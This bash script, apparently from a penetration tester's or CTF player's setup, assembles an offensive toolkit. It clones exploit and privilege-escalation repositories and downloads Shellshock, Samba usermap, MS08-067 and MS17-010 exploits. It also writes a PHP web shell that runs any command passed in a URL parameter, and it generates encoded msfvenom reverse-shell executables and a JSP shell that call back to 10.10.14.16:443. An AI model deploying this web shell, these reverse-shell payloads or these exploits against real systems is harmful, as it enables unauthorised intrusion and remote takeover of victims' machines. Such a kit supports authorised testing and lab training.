#!/bin/bash

apt update -y
#apt upgrade -y
apt install -y git

git clone --depth=1 --recursive https://github.com/ayomawdb/AutoRecon.git
cd AutoRecon
git pull
cd -

git clone --depth=1 --recursive https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings
git pull
cd -

git clone --depth=1 --recursive https://github.com/fuzzdb-project/fuzzdb.git
cd fuzzdb
git pull
cd -

git clone --depth=1 --recursive https://github.com/danielmiessler/SecLists.git
cd SecLists
git pull
cd -

git clone --depth=1 --recursive https://github.com/trailofbits/protofuzz.git
cd protofuzz
git pull
cd -

git clone --depth=1 --recursive https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
git pull
cd -

git clone --depth=1 --recursive https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git
cd Linux_Exploit_Suggester
git pull
cd -

git clone --depth=1 --recursive https://github.com/jondonas/linux-exploit-suggester-2.git
cd linux-exploit-suggester-2
git pull
cd -

git clone --depth=1 --recursive https://github.com/Arr0way/linux-local-enumeration-script.git
cd linux-local-enumeration-script
git pull
cd -

git clone --depth=1 --recursive https://github.com/sleventyeleven/linuxprivchecker.git
cd linuxprivchecker
git pull
cd -

git clone --depth=1 --recursive https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester
git pull
cd -

git clone --depth=1 --recursive https://github.com/rebootuser/LinEnum.git
cd LinEnum
git pull
cd -

git clone --depth=1 --recursive https://github.com/DominicBreuker/pspy.git
cd pspy
git pull
cd -

git clone --depth=1 --recursive https://github.com/GDSSecurity/PadBuster.git
cd PadBuster
git pull
cd -

git clone --depth=1 --recursive https://github.com/bitsadmin/wesng.git
cd wesng
git pull
cd -

git clone --depth=1 --recursive https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
git pull
cd -

git clone --depth=1 --recursive https://github.com/rasta-mouse/Watson.git
cd Watson
git pull
cd -

mkdir scripts
cd  scripts

# Linux
wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
wget https://raw.githubusercontent.com/Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32s
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64s

# Windows
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
wget https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net35.exe
wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net45.exe
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

# Common
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
wget https://www.exploit-db.com/download/34900
mv 34900 shellshock.py
chmod +x *

cd -

echo '<?php
$cmd=$_GET["cmd"];
system($cmd);
?>' > scripts/shell.php

mkdir -p exploits/samba
cd exploits/samba
wget https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py
cd -


mkdir -p exploits/ms08-067
cd exploits/ms08-067
wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
cd -

mkdir -p exploits/ms17-010
cd exploits/ms17-010
git clone --depth=1 https://github.com/helviojunior/MS17-010.git .
git pull
cd -

cd exploits
git clone --depth=1 https://github.com/abatchy17/WindowsExploits.git
cd -
cd exploits/WindowsExploits
git pull
cd -

cd exploits
git clone --depth=1 https://github.com/SecWiki/windows-kernel-exploits.git
cd -
cd exploits/windows-kernel-exploits
git pull
cd -

cd exploits
git clone --depth=1 https://github.com/SecWiki/linux-kernel-exploits.git
cd -
cd exploits/linux-kernel-exploits
git pull
cd -

cd exploits
git clone --depth=1 https://github.com/Re4son/Chimichurri.git
cd -
cd exploits/Chimichurri
git pull
cd -

mkdir msfvenom
cd msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell_reverse_tcp_x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 EXITFUNC=thread -f exe -a x64 --platform windows -o shell_reverse_tcp_x64.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 EXITFUNC=thread -f exe -a x64 --platform windows -e x64/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 lport=443 -f raw > shell_reverse_tcp.jsp
cd -


# Setup ODATA
